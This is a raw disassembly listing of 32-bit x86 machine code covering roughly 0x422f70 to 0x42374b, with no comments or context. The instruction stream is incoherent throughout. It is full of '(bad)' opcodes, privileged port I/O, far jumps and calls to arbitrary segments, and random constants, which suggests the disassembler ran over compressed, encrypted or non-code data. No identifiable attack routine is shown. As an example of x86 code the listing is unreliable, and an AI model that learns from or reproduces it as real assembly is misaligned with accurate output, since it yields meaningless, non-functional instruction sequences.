  422f70:	or     BYTE PTR [edi],bh
  422f72:	xlat   BYTE PTR ds:[ebx]
  422f73:	scas   al,BYTE PTR es:[edi]
  422f74:	xor    al,0xe2
  422f76:	test   dl,cl
  422f78:	mov    ch,0xde
  422f7a:	sub    DWORD PTR [ebx+0x77553f8c],esi
  422f80:	inc    ebx
  422f81:	pushf  
  422f82:	jb     0x422f17
  422f84:	jo     0x422fbc
  422f86:	cmp    eax,0x3a39d171
  422f8b:	or     eax,0xc1a14c37
  422f90:	cli    
  422f91:	mov    ds:0x9bf8fa83,al
  422f96:	es and eax,0xe6b4e068
  422f9c:	jg     0x422f80
  422f9e:	call   0x874fdc0
  422fa3:	fadd   DWORD PTR [ecx]
  422fa5:	sbb    BYTE PTR [edx-0x1f7fcf8e],dh
  422fab:	mov    ebx,0xb83991ec
  422fb0:	or     al,0x7e
  422fb2:	out    0x14,eax
  422fb4:	fbld   TBYTE PTR [ebx+ecx*2+0x52af1d53]
  422fbb:	or     esp,DWORD PTR [ecx]
  422fbd:	repz lahf 
  422fbf:	push   ebx
  422fc0:	add    al,0xcf
  422fc2:	sbb    al,0xb
  422fc4:	xor    DWORD PTR [edx+edi*8+0x55],0x15
  422fc9:	mov    ds:0x3403d30d,al
  422fce:	mul    ecx
  422fd0:	cmp    eax,0x3275f613
  422fd5:	enter  0xcf17,0x48
  422fd9:	push   edi
  422fda:	sar    BYTE PTR [ecx],1
  422fdc:	xchg   BYTE PTR [eax],al
  422fde:	add    BYTE PTR [eax],al
  422fe0:	add    BYTE PTR [eax],al
  422fe2:	cvtdq2ps xmm0,XMMWORD PTR [esi+edx*1+0x5b9fdfd4]
  422fea:	dec    ebp
  422feb:	sar    ebx,cl
  422fed:	adc    ebp,DWORD PTR [eax-0x38]
  422ff0:	pop    ebp
  422ff1:	dec    BYTE PTR [edx-0x57]
  422ff4:	add    DWORD PTR [eax],eax
  422ff6:	repz add al,0x0
  422ff9:	add    BYTE PTR [esi+0x57559128],dl
  422fff:	test   ebx,0x9f813dc5
  423005:	aam    0x1f
  423007:	xor    ebx,edi
  423009:	dec    ebp
  42300a:	jno    0x422f96
  42300c:	xor    al,0xa2
  42300e:	aas    
  42300f:	test   DWORD PTR [ecx+esi*8],edi
  423012:	mov    cl,0x3c
  423014:	les    edx,FWORD PTR [edx+0x4e2a6d0b]
  42301a:	pop    edi
  42301b:	xor    DWORD PTR [ebx+ebp*2-0xe0c7630],edx
  423022:	leave  
  423023:	fwait
  423024:	arpl   WORD PTR [ebx],ax
  423026:	jne    0x42306c
  423028:	aad    0x8e
  42302a:	js     0x422feb
  42302c:	out    dx,al
  42302d:	aaa    
  42302e:	sahf   
  42302f:	mov    esi,0x1d16c464
  423034:	and    bl,BYTE PTR [edx+0xd]
  423037:	adc    DWORD PTR [edx+0x4a],eax
  42303a:	mul    BYTE PTR [esi-0x2a]
  42303d:	sbb    DWORD PTR [eax+0xaf19ef1],ecx
  423043:	fs push ss
  423045:	push   ebp
  423046:	(bad)  
  423047:	lahf   
  423048:	int3   
  423049:	and    BYTE PTR [ebx+0x5befdcf4],0x39
  423050:	cdq    
  423051:	clc    
  423052:	test   al,0x7e
  423054:	std    
  423055:	cmp    eax,DWORD PTR [eax]
  423057:	mov    edi,0xd10503f6
  42305c:	mov    ds:0x41326c86,eax
  423061:	into   
  423062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423063:	sahf   
  423064:	sbb    eax,0xace855a8
  423069:	jnp    0x42302d
  42306b:	sub    eax,0x17740cb9
  423070:	dec    ecx
  423071:	jbe    0x4230db
  423073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423074:	pop    edi
  423075:	clc    
  423076:	xor    al,bh
  423078:	pop    ebx
  423079:	xchg   edi,eax
  42307a:	adc    ch,dl
  42307c:	sub    BYTE PTR [ebp+0xb],ah
  42307f:	push   eax
  423080:	sbb    eax,0x526b9786
  423085:	aad    0x9e
  423087:	mov    ch,0x89
  423089:	cmp    eax,0xe9fe609d
  42308e:	test   dh,dh
  423090:	add    bl,BYTE PTR [ebx]
  423092:	fdivr  DWORD PTR [ebx]
  423094:	fldenv [edx+ebp*1-0x736213bf]
  42309b:	add    DWORD PTR [ecx+eiz*1-0x28],0x58
  4230a0:	daa    
  4230a1:	popa   
  4230a2:	mov    eax,0xbb02b35b
  4230a7:	out    0x13,al
  4230a9:	mov    esp,0xbb348dd7
  4230ae:	ins    BYTE PTR es:[edi],dx
  4230af:	mov    cl,0x2e
  4230b1:	xchg   ecx,eax
  4230b3:	mov    WORD PTR [ecx],cs
  4230b5:	scas   al,BYTE PTR es:[edi]
  4230b6:	into   
  4230b7:	mov    ah,0xc2
  4230b9:	nop
  4230ba:	sbb    al,0xbf
  4230bc:	out    dx,eax
  4230bd:	push   0x2a
  4230bf:	aas    
  4230c0:	mov    ebp,0x641b1f74
  4230c5:	repnz add eax,0xc06af1b2
  4230cb:	xlat   BYTE PTR ds:[ebx]
  4230cc:	leave  
  4230cd:	adc    cl,BYTE PTR [esi+0x32a7de10]
  4230d3:	and    esp,DWORD PTR [ecx+0x44]
  4230d6:	pusha  
  4230d7:	xor    DWORD PTR [eax-0x52],ecx
  4230da:	cmp    al,0x75
  4230dc:	add    al,0xc9
  4230de:	int    0x8a
  4230e0:	sbb    DWORD PTR [edx+0x57bff96d],eax
  4230e6:	adc    DWORD PTR [eax+0x266fdc8c],esp
  4230ec:	in     al,dx
  4230ed:	mov    ds:0x137b5791,eax
  4230f2:	or     al,0x3f
  4230f4:	js     0x4230ab
  4230f6:	cmc    
  4230f7:	out    0xaa,al
  4230f9:	sbb    ebx,eax
  4230fb:	dec    eax
  4230fc:	xor    esi,ecx
  4230fe:	fiadd  DWORD PTR [ebx-0x72]
  423101:	cmp    ch,al
  423103:	test   al,0xc8
  423105:	xor    DWORD PTR [esi+0xc],edi
  423108:	imul   ecx,DWORD PTR [esp+esi*1-0x63],0x11
  42310d:	loopne 0x423119
  42310f:	icebp  
  423110:	popf   
  423111:	retf   0xaf48
  423114:	mov    edx,0xe153d049
  423119:	out    dx,eax
  42311a:	mov    WORD PTR [eax+0x3307103d],ds
  423120:	aam    0xeb
  423122:	sti    
  423123:	pop    ebp
  423124:	stos   BYTE PTR es:[edi],al
  423125:	sub    BYTE PTR [ebx+0x42],0x8f
  423129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42312a:	or     eax,0x6d4b9616
  42312f:	ds jge 0x423180
  423132:	mov    esp,DWORD PTR [eax]
  423134:	outs   dx,DWORD PTR ds:[esi]
  423135:	std    
  423136:	test   DWORD PTR [ebx+0x44],edi
  423139:	rol    DWORD PTR [ecx+0x51],cl
  42313c:	(bad)  
  42313d:	stc    
  42313e:	(bad)  
  42313f:	sbb    al,0xe3
  423141:	xor    eax,0x9207dc80
  423146:	jno    0x42318a
  423148:	pusha  
  423149:	bound  edi,QWORD PTR [ebp-0x1966eec]
  42314f:	add    edi,DWORD PTR [ecx+0x0]
  423152:	pop    esp
  423153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423154:	mov    ds:0x20495e3a,eax
  423159:	jmp    0x11b6daeb
  42315e:	test   DWORD PTR [esi+0x5a6f4f7b],ebx
  423164:	or     BYTE PTR ss:[esi+eiz*4+0x30],al
  423169:	sub    ecx,DWORD PTR [ecx]
  42316b:	out    0xb2,eax
  42316d:	mov    ds:0xe24d5372,eax
  423172:	outs   dx,DWORD PTR ds:[esi]
  423173:	out    0x7,eax
  423175:	mov    ebp,0xf34b0563
  42317a:	stos   BYTE PTR es:[edi],al
  42317b:	sbb    dl,BYTE PTR [edx]
  42317d:	bound  edx,QWORD PTR [ebx+0x209819e0]
  423183:	push   cs
  423184:	out    0xa9,eax
  423186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423187:	fsubp  st(2),st
  423189:	push   esi
  42318a:	enter  0x62bd,0x40
  42318e:	jb     0x423128
  423190:	mov    ebp,0xe4b426d0
  423195:	nop
  423196:	or     BYTE PTR [edx+edi*8+0x7],0x5f
  42319b:	cdq    
  42319c:	fwait
  42319d:	pop    ebx
  42319e:	sbb    eax,0x6ba845d5
  4231a3:	push   0x57
  4231a5:	enter  0xac90,0x10
  4231a9:	retf   0x4608
  4231ac:	(bad)  
  4231ad:	cmc    
  4231ae:	dec    ebp
  4231af:	mov    ah,0x31
  4231b1:	push   cs
  4231b2:	cmp    eax,0xaeddeee0
  4231b7:	sahf   
  4231b8:	enter  0xaed0,0xe7
  4231bc:	jl     0x423209
  4231be:	cld    
  4231bf:	jne    0x4231df
  4231c1:	xchg   edx,eax
  4231c2:	add    bh,bh
  4231c4:	pop    esp
  4231c5:	stos   DWORD PTR es:[edi],eax
  4231c6:	int    0x1
  4231c8:	shl    BYTE PTR [ecx+0x32],1
  4231cb:	adc    eax,0xd28df40f
  4231d0:	xchg   ebx,eax
  4231d1:	or     dl,bh
  4231d3:	sti    
  4231d4:	xchg   edi,eax
  4231d5:	in     al,dx
  4231d6:	mov    WORD PTR [eax],?
  4231d8:	sar    BYTE PTR [ecx],1
  4231da:	outs   dx,DWORD PTR ds:[esi]
  4231db:	int    0xf0
  4231dd:	cs jp  0x4231d0
  4231e0:	sahf   
  4231e1:	or     al,0x99
  4231e3:	in     eax,0x19
  4231e5:	data16 test BYTE PTR [ecx],ch
  4231e8:	or     al,BYTE PTR [esi-0x4a]
  4231eb:	dec    eax
  4231ec:	movaps XMMWORD PTR [eax+0x22],xmm0
  4231f0:	inc    edi
  4231f1:	aas    
  4231f2:	out    dx,eax
  4231f3:	test   BYTE PTR [eax+0x7e],ch
  4231f6:	test   BYTE PTR [edi+0x54],0xee
  4231fa:	sar    DWORD PTR [esi+edi*4+0x53b46f4e],1
  423201:	out    0x8d,al
  423203:	std    
  423204:	push   ebp
  423205:	call   0xe4ba:0xc7bd56a
  42320c:	test   DWORD PTR [edi+0x5],esi
  42320f:	retf   
  423210:	or     esp,DWORD PTR es:[ebp-0x4a]
  423214:	stos   DWORD PTR es:[edi],eax
  423215:	ss mov bl,0x5f
  423218:	mov    dh,0x3
  42321a:	push   ebp
  42321b:	imul   eax,DWORD PTR [eax],0x6dd287b1
  423221:	add    DWORD PTR cs:[esi],ebx
  423224:	fild   DWORD PTR [eax+0x12]
  423227:	(bad)  
  423228:	cs sahf 
  42322a:	loop   0x423218
  42322c:	cli    
  42322d:	fimul  DWORD PTR [edx+0x1]
  423230:	imul   edx,ebp,0x1326d290
  423236:	dec    esi
  423237:	outs   dx,BYTE PTR ds:[esi]
  423238:	adc    edx,ecx
  42323a:	jns    0x423214
  42323c:	pop    ebx
  42323d:	call   0xc8be:0xed5156d2
  423244:	std    
  423245:	ror    DWORD PTR [ebx],cl
  423247:	or     eax,0x77c2f18a
  42324c:	adc    cl,BYTE PTR [esi]
  42324e:	mov    edi,0xe11b4094
  423253:	cmp    eax,DWORD PTR [edi]
  423255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423256:	stc    
  423257:	xor    al,0xeb
  423259:	fnstsw WORD PTR [eax+0x20f56490]
  42325f:	jnp    0x42328a
  423261:	nop
  423262:	mov    ds:0xbe72b281,al
  423267:	pop    es
  423268:	and    edi,DWORD PTR [esi+0x54]
  42326b:	repnz pusha 
  42326d:	test   BYTE PTR [eax+0x12381fe4],ch
  423273:	pop    ebp
  423274:	mov    ch,0x89
  423276:	mov    esi,0x478138b2
  42327b:	test   edi,ebx
  42327d:	fwait
  42327e:	sub    DWORD PTR [ebx+0x7c08d0bd],0x60fa87fb
  423288:	adc    ah,BYTE PTR [edi]
  42328a:	push   cs
  42328b:	sbb    dl,bl
  42328d:	popf   
  42328e:	cmp    eax,0x1a58854d
  423293:	mov    dl,0x11
  423295:	dec    ecx
  423296:	jle    0x423256
  423298:	ins    DWORD PTR es:[edi],dx
  423299:	and    al,0x46
  42329b:	ret    
  42329c:	mov    eax,esi
  42329e:	mov    eax,0xa1a19dbf
  4232a3:	sbb    al,0x42
  4232a5:	sbb    eax,0x4c864776
  4232aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232ab:	or     al,0xb7
  4232ad:	daa    
  4232ae:	test   DWORD PTR [ecx-0x2d],esi
  4232b1:	sbb    DWORD PTR [ebp-0x1],ebx
  4232b4:	xchg   ebx,eax
  4232b5:	adc    eax,0x6b5c61c3
  4232ba:	cld    
  4232bb:	call   ebx
  4232bd:	and    BYTE PTR [edx],0x2d
  4232c0:	ins    DWORD PTR es:[edi],dx
  4232c1:	sub    eax,0x7b0c88b4
  4232c6:	fcomip st,st(7)
  4232c8:	pop    edi
  4232c9:	mov    ds,WORD PTR [ebx+0x239012]
  4232cf:	stos   BYTE PTR es:[edi],al
  4232d0:	dec    edx
  4232d1:	xchg   ecx,eax
  4232d2:	ins    BYTE PTR es:[edi],dx
  4232d3:	les    edx,FWORD PTR [ecx+ecx*2+0x10]
  4232d7:	sub    esp,DWORD PTR [ecx-0x29]
  4232da:	mul    DWORD PTR [edx]
  4232dc:	add    BYTE PTR [edx],ch
  4232de:	adc    bl,BYTE PTR [ebx-0x62]
  4232e1:	stc    
  4232e2:	mov    cl,0xf
  4232e4:	inc    ecx
  4232e5:	inc    edx
  4232e6:	loope  0x423268
  4232e8:	loopne 0x4232aa
  4232ea:	aas    
  4232eb:	mov    WORD PTR [edx],?
  4232ed:	add    eax,0xf21d183e
  4232f2:	mul    DWORD PTR [edi+0x4141c1aa]
  4232f8:	pushf  
  4232f9:	retf   0xf3b2
  4232fc:	mov    ah,0x8
  4232fe:	(bad)  
  423301:	dec    ebp
  423302:	cli    
  423303:	jne    0x42333c
  423305:	lds    ecx,FWORD PTR [esp+ebp*8-0x19]
  423309:	shl    DWORD PTR [esi],0xff
  42330c:	jne    0x423359
  42330e:	out    dx,eax
  42330f:	xchg   BYTE PTR [eax+eiz*1+0x398a1982],cl
  423316:	js     0x423303
  423318:	sbb    BYTE PTR [esi-0x1d],ah
  42331b:	and    DWORD PTR [edx+0x431f4af3],0x891e0c32
  423325:	adc    BYTE PTR [ecx],dl
  423327:	imul   ebp,DWORD PTR [esi+0x1c90c539],0x66
  42332e:	(bad)  
  42332f:	xor    DWORD PTR [edx-0x70de8133],ebp
  423335:	mov    bh,0x31
  423337:	ss dec ecx
  423339:	inc    ebp
  42333a:	fistp  DWORD PTR [eax-0x9bbafc6]
  423340:	push   eax
  423341:	inc    ecx
  423342:	lods   eax,DWORD PTR ds:[esi]
  423343:	adc    edi,0xcb2f21ef
  423349:	mov    bl,0xff
  42334b:	ins    DWORD PTR es:[edi],dx
  42334c:	mov    BYTE PTR ds:0x10587b0b,dl
  423352:	push   es
  423353:	pop    eax
  423354:	xor    BYTE PTR [ebx],ah
  423356:	(bad)  
  423357:	sti    
  423358:	mov    bh,0xbc
  42335a:	sub    ch,cl
  42335c:	out    0xb7,al
  42335e:	lods   eax,DWORD PTR ds:[esi]
  42335f:	jmp    0x4233cd
  423361:	push   esi
  423362:	cwde   
  423363:	test   BYTE PTR [eax-0x4],cl
  423366:	enter  0xd49c,0xd
  42336a:	fild   DWORD PTR [esi+eax*8-0x614c89f]
  423371:	mov    BYTE PTR [ebx-0x3b3da0d7],dl
  423377:	push   eax
  423378:	pop    ecx
  423379:	or     eax,0xb5524f95
  42337e:	xchg   esi,eax
  42337f:	sar    BYTE PTR [ecx],0xe8
  423382:	inc    ecx
  423383:	lods   eax,DWORD PTR ds:[esi]
  423384:	sbb    bl,BYTE PTR [esi+0x67]
  423387:	add    al,bl
  423389:	cli    
  42338a:	jno    0x42333a
  42338c:	cmp    BYTE PTR [eax+0x5ceaa890],ah
  423392:	mov    edx,0xf836b5ae
  423397:	imul   ebx,DWORD PTR [esi-0x42],0xbcbe721c
  42339e:	adc    DWORD PTR [ebx-0x1b0bba52],0x403c30a0
  4233a8:	cli    
  4233a9:	jle    0x4233aa
  4233ab:	cmp    ecx,DWORD PTR [ebx]
  4233ad:	enter  0x743,0xd0
  4233b1:	xor    ah,BYTE PTR [esi+ebp*8+0x32]
  4233b5:	adc    BYTE PTR [bp-0x6803],al
  4233ba:	sbb    ah,ch
  4233bc:	enter  0x6128,0xe6
  4233c0:	push   es
  4233c1:	jecxz  0x4233d9
  4233c3:	sar    al,cl
  4233c5:	out    dx,eax
  4233c6:	bound  edi,QWORD PTR [ebp+0x7f]
  4233c9:	pushf  
  4233ca:	push   0xffffffa4
  4233cc:	cmp    ebp,DWORD PTR [edi-0x41]
  4233cf:	xor    ecx,DWORD PTR [ecx+ebx*1-0x6]
  4233d3:	dec    edi
  4233d4:	mov    edx,DWORD PTR [eax]
  4233d6:	ins    DWORD PTR es:[edi],dx
  4233d7:	popf   
  4233d8:	push   ebx
  4233d9:	cmc    
  4233da:	and    DWORD PTR [ebp-0x70],esp
  4233dd:	cmc    
  4233de:	mov    ch,0x88
  4233e0:	retf   
  4233e1:	jl     0x423367
  4233e3:	adc    esp,DWORD PTR [ebx-0x48c20dc3]
  4233e9:	(bad)  
  4233ea:	(bad)  
  4233eb:	imul   ecx,edx,0x2a
  4233ee:	add    eax,0xdfb5f19
  4233f3:	sub    al,0xba
  4233f5:	or     eax,0x129f1a42
  4233fa:	mov    WORD PTR [ebx],ds
  4233fc:	out    0xa3,eax
  4233fe:	shr    edx,1
  423400:	es aad 0x64
  423403:	jo     0x42342e
  423405:	shl    DWORD PTR [edi],1
  423407:	sbb    BYTE PTR [esp+edi*2],dl
  42340a:	mov    eax,ds:0xf7dda252
  42340f:	sub    DWORD PTR [edi],esi
  423411:	jae    0x423465
  423413:	add    DWORD PTR [eax+0x5d56e1d4],eax
  423419:	and    al,0xdc
  42341b:	aaa    
  42341c:	mov    edx,0x8596d7e7
  423421:	or     eax,0xf9b07359
  423426:	push   0x6a5db345
  42342b:	daa    
  42342c:	fisub  DWORD PTR [ebx-0x14867be9]
  423432:	mov    al,ds:0x40bd0486
  423437:	(bad)  
  423439:	fidiv  WORD PTR [eax]
  42343b:	add    esp,DWORD PTR [ecx-0x38]
  42343e:	mov    edx,0x3aa60252
  423443:	adc    edx,DWORD PTR [ecx+0x71e60c15]
  423449:	popf   
  42344a:	stc    
  42344b:	fld    TBYTE PTR [eax+eax*2+0x5e5df0f2]
  423452:	dec    edi
  423453:	push   ebp
  423454:	(bad)  
  423455:	rcr    esi,cl
  423457:	sbb    BYTE PTR [ecx],dl
  423459:	cmp    esi,ebx
  42345b:	fmul   DWORD PTR [edx+0x50]
  42345e:	aam    0xed
  423460:	jae    0x423448
  423462:	mov    ds:0x704d26be,al
  423467:	das    
  423468:	inc    ebp
  423469:	jmp    0x42344f
  42346b:	mov    esi,0xe72396ed
  423470:	das    
  423471:	pop    ss
  423472:	jae    0x4234cf
  423474:	lods   eax,DWORD PTR ds:[esi]
  423475:	dec    esi
  423476:	dec    ebp
  423477:	push   cs
  423478:	adc    eax,0x7b5ccc21
  42347d:	pusha  
  42347e:	pop    ebp
  42347f:	stc    
  423480:	xchg   DWORD PTR [eax],ebx
  423482:	mov    ecx,0xd370bedd
  423487:	pop    esi
  423488:	clc    
  423489:	test   al,0xb6
  42348b:	mov    ecx,0xab83e4c3
  423490:	push   ecx
  423491:	pop    esp
  423492:	cmovl  edx,edx
  423495:	repnz sub cl,cl
  423498:	and    DWORD PTR [edx+0x5f535ca4],esi
  42349e:	mov    dh,bl
  4234a0:	inc    edi
  4234a1:	add    cl,bh
  4234a3:	(bad)  
  4234a4:	sti    
  4234a5:	pfrsqrt mm3,QWORD PTR [esi]
  4234a9:	mov    BYTE PTR [edi+0x63],dh
  4234ac:	jb     0x423505
  4234ae:	lds    ebp,FWORD PTR [ebx]
  4234b0:	mov    esp,0x606cc1a
  4234b5:	jmp    0x5cfb:0xc4250024
  4234bc:	mov    al,0x55
  4234be:	(bad)  
  4234bf:	iret   
  4234c0:	xchg   bh,bh
  4234c2:	cli    
  4234c3:	sbb    dl,BYTE PTR [ebx+0x42]
  4234c6:	jg     0x4234a2
  4234c8:	test   BYTE PTR [ebp-0x4f],bh
  4234cb:	loopne 0x4234bf
  4234cd:	xchg   edx,eax
  4234ce:	mov    WORD PTR [edx],fs
  4234d0:	fucomi st,st(3)
  4234d2:	adc    BYTE PTR [edx+0x5e],ah
  4234d5:	sub    eax,0x4910fe34
  4234da:	lock stc 
  4234dc:	pop    ebx
  4234dd:	push   edi
  4234de:	repz jl 0x423542
  4234e1:	cmp    al,0x1
  4234e3:	pop    edi
  4234e4:	cmp    edi,DWORD PTR [ebx+0x505d5912]
  4234ea:	cmp    al,0xb1
  4234ec:	cmp    BYTE PTR [eax],al
  4234ee:	add    BYTE PTR [eax],al
  4234f0:	add    BYTE PTR [eax],al
  4234f2:	dec    ecx
  4234f3:	mov    ds:0xf6ffd655,eax
  4234f8:	retf   
  4234f9:	mov    edi,0x3f1d56c2
  4234fe:	pop    ebp
  4234ff:	aas    
  423500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423501:	cwde   
  423502:	cmp    eax,0xf30001ae
  423507:	add    al,0x0
  423509:	add    BYTE PTR [edx+ecx*4+0x2],bl
  42350d:	retf   0x80c6
  423510:	inc    eax
  423511:	and    al,0xf4
  423513:	lahf   
  423514:	pop    esp
  423515:	mov    dh,0x1f
  423517:	enter  0x272d,0x11
  42351b:	out    0x34,eax
  42351d:	out    0x7c,eax
  42351f:	xchg   esp,eax
  423520:	pop    eax
  423521:	pop    ds
  423522:	cs jmp 0x4234e9
  423525:	shl    DWORD PTR [ebx-0x1d],1
  423528:	xchg   ecx,eax
  423529:	add    al,0x3
  42352b:	mov    dl,0x35
  42352d:	pop    ebp
  42352e:	dec    eax
  42352f:	jmp    0x423500
  423531:	mov    ah,0x70
  423533:	data16 daa 
  423535:	std    
  423536:	dec    esp
  423537:	sbb    edi,DWORD PTR [esi+0x38]
  42353a:	(bad)  
  42353b:	rcr    DWORD PTR [ebx+0x26a3c41],cl
  423541:	scas   al,BYTE PTR es:[edi]
  423542:	psrad  mm7,QWORD PTR [ecx-0x201e3bed]
  423549:	pop    ds
  42354a:	(bad)  
  42354b:	fdivr  DWORD PTR [esi+ecx*4-0x59]
  42354f:	and    BYTE PTR [eax],bh
  423551:	push   es
  423552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423553:	and    al,0xfc
  423555:	mov    ch,0x2b
  423557:	cs fcmovnu st,st(1)
  42355a:	push   es
  42355b:	and    DWORD PTR [eax+0x16],edx
  42355e:	mov    bl,0x95
  423560:	jno    0x423563
  423562:	mov    dl,0x9a
  423564:	cmp    bl,BYTE PTR [eax]
  423566:	(bad)  
  423568:	leave  
  423569:	loopne 0x42350b
  42356b:	imul   ecx,edx,0x506f8493
  423571:	push   cs
  423572:	push   eax
  423573:	adc    bh,BYTE PTR [esi+0x2]
  423576:	mov    BYTE PTR [esi],al
  423578:	inc    esp
  423579:	mov    ch,0x3f
  42357b:	pop    ebp
  42357c:	in     al,dx
  42357d:	xor    DWORD PTR [edx+0x27],ebx
  423580:	dec    ebp
  423581:	lock pop ebx
  423583:	jb     0x423570
  423585:	xchg   ebx,eax
  423586:	push   eax
  423587:	sti    
  423588:	hlt    
  423589:	xor    al,BYTE PTR [edx+ecx*4-0x51cc1983]
  423590:	cdq    
  423591:	aas    
  423592:	inc    ebx
  423593:	in     eax,dx
  423594:	lock jo 0x4235d3
  423597:	add    al,BYTE PTR [ebx]
  423599:	mov    cs,ebx
  42359b:	or     eax,0xd1ff0d91
  4235a0:	dec    ecx
  4235a1:	in     eax,dx
  4235a2:	lea    ecx,[ebx-0x4afb3644]
  4235a8:	cwde   
  4235a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235aa:	(bad)  
  4235ab:	int3   
  4235ac:	test   eax,0xaeb62cd
  4235b1:	(bad)  
  4235b2:	call   0xe1e33f27
  4235b7:	jge    0x42360a
  4235b9:	sbb    dh,BYTE PTR [edx]
  4235bb:	out    dx,al
  4235bc:	cld    
  4235bd:	iret   
  4235be:	push   ebx
  4235bf:	jle    0x423616
  4235c1:	ret    
  4235c2:	push   cs
  4235c3:	(bad)  
  4235c4:	adc    al,0x30
  4235c6:	in     eax,dx
  4235c7:	int    0x18
  4235c9:	icebp  
  4235ca:	pop    eax
  4235cb:	sub    al,0x6a
  4235cd:	or     DWORD PTR [ecx],0xf89d5731
  4235d3:	fild   DWORD PTR [esp+eiz*4]
  4235d6:	mov    ss,WORD PTR [edi+0xe]
  4235d9:	int    0x97
  4235db:	mov    cl,0xde
  4235dd:	fidivr WORD PTR [ecx+0x59]
  4235e0:	mov    ds:0xf0477b28,eax
  4235e5:	arpl   WORD PTR [ebx+0x1f73956c],cx
  4235eb:	xor    bh,cl
  4235ed:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235ef:	xchg   esp,eax
  4235f0:	outs   dx,DWORD PTR ds:[esi]
  4235f1:	aad    0xf7
  4235f3:	xor    ebx,DWORD PTR [ebx]
  4235f5:	sbb    DWORD PTR [ecx-0x74],esp
  4235f8:	jne    0x423599
  4235fa:	out    0x8a,al
  4235fc:	loop   0x4235d9
  4235fe:	dec    ebx
  4235ff:	cmp    eax,0xbbc4a80a
  423604:	cmp    eax,0x10c5b473
  423609:	out    dx,eax
  42360a:	jge    0x42363f
  42360c:	and    edx,ebp
  42360e:	add    edi,0xbbe3dfdd
  423614:	inc    ecx
  423615:	rol    ecx,1
  423617:	jnp    0x4235ac
  423619:	mov    eax,ds:0xeb756524
  42361e:	and    ecx,esp
  423620:	cmp    ch,BYTE PTR [edx+0x27]
  423623:	sbb    dl,BYTE PTR [ebp+0x375da44f]
  423629:	imul   eax,DWORD PTR [ecx+0xc556dc5],0x5f37dc8e
  423633:	xchg   BYTE PTR gs:[eax+0x62],dl
  423637:	cmp    al,0x3
  423639:	je     0x423686
  42363b:	or     ah,cl
  42363d:	sbb    ecx,ebp
  42363f:	in     al,0xec
  423641:	cmp    eax,0x2312b3e2
  423646:	pop    eax
  423647:	sar    DWORD PTR [edx-0x6a],0xac
  42364b:	pop    ebp
  42364c:	in     al,dx
  42364d:	les    eax,FWORD PTR [ebx+0x53ac7d41]
  423653:	in     eax,dx
  423654:	and    al,0x58
  423656:	jo     0x4235ea
  423658:	jmp    0x78fe1f3c
  42365d:	mov    ds:0x93ec8ee,eax
  423662:	pusha  
  423663:	imul   DWORD PTR [eax]
  423665:	fidiv  WORD PTR [edx+0x1a]
  423668:	pushf  
  423669:	les    edx,FWORD PTR ds:0x6501937b
  42366f:	mov    BYTE PTR [ecx+0x68d75663],dh
  423675:	ja     0x42369f
  423677:	ins    DWORD PTR es:[edi],dx
  423678:	xlat   BYTE PTR ds:[ebx]
  423679:	out    dx,al
  42367a:	mov    bl,0x8
  42367c:	dec    esp
  42367d:	inc    eax
  42367e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42367f:	shl    BYTE PTR ds:0x4b927130,1
  423685:	sub    al,0xc2
  423687:	enter  0x6ca5,0xbd
  42368b:	in     al,0x75
  42368d:	es mov dl,0xa2
  423690:	jmp    0x6a3fb1e2
  423695:	ret    0x5c38
  423698:	pop    ebx
  423699:	jmp    0xb16f:0x558a23fc
  4236a0:	xchg   esi,eax
  4236a1:	not    BYTE PTR [esp+eiz*2]
  4236a4:	cmp    BYTE PTR [ecx+0x74b6e3e7],dh
  4236aa:	mov    BYTE PTR [ebx],dh
  4236ac:	add    eax,0xdec4aab6
  4236b1:	and    al,0x79
  4236b3:	fs mov edi,gs
  4236b6:	inc    esp
  4236b7:	je     0x42364f
  4236b9:	std    
  4236ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236bb:	imul   edi,eax,0x1a12debd
  4236c1:	push   cs
  4236c2:	add    BYTE PTR [edx-0x2d],cl
  4236c5:	fmulp  st(4),st
  4236c7:	adc    BYTE PTR [edi-0x9],bl
  4236ca:	push   ss
  4236cb:	cmp    al,0xe0
  4236cd:	ss jmp 0xa31c:0x42b5746f
  4236d5:	mov    esp,0xb266f048
  4236da:	pop    ds
  4236db:	adc    al,0x62
  4236dd:	call   0x66af:0xcc661683
  4236e4:	adc    BYTE PTR [edi],0x97
  4236e7:	mov    eax,0x76d29cc
  4236ec:	outs   dx,BYTE PTR ds:[esi]
  4236ed:	fsubrp st(0),st
  4236ef:	mov    al,0xa
  4236f1:	or     bh,bl
  4236f3:	jnp    0x423739
  4236f5:	loope  0x423734
  4236f7:	jnp    0x42367b
  4236f9:	jl     0x4236a7
  4236fb:	add    bh,BYTE PTR [ebx-0x33e6d6da]
  423701:	cwde   
  423702:	loopne 0x423772
  423704:	popa   
  423705:	push   eax
  423706:	mov    ah,0xf6
  423708:	mov    ss,esi
  42370a:	adc    eax,0x487e0727
  42370f:	fs int 0x7a
  423712:	mov    eax,0x3efb1c2d
  423717:	ja     0x423702
  423719:	scas   al,BYTE PTR es:[edi]
  42371a:	sbb    DWORD PTR [edi],ecx
  42371c:	scas   eax,DWORD PTR es:[edi]
  42371d:	push   0xb836689a
  423722:	fmul   st,st(4)
  423724:	retf   0xecda
  423727:	sub    al,0x99
  423729:	sub    al,0x87
  42372b:	inc    edx
  42372c:	into   
  42372d:	xchg   esp,eax
  42372e:	outs   dx,DWORD PTR ds:[esi]
  42372f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423730:	gs into 
  423732:	aad    0x5c
  423734:	push   ebx
  423735:	lods   eax,DWORD PTR ds:[esi]
  423736:	test   cl,dh
  423738:	pop    esi
  423739:	out    0xd1,al
  42373b:	or     al,0xd1
  42373d:	call   0x4ec3:0x20dc091d
  423744:	inc    eax
  423745:	mov    eax,ds:0x95e1ea51
  42374a:	std    
  42374b:	mov    esi,0xeb4e232c
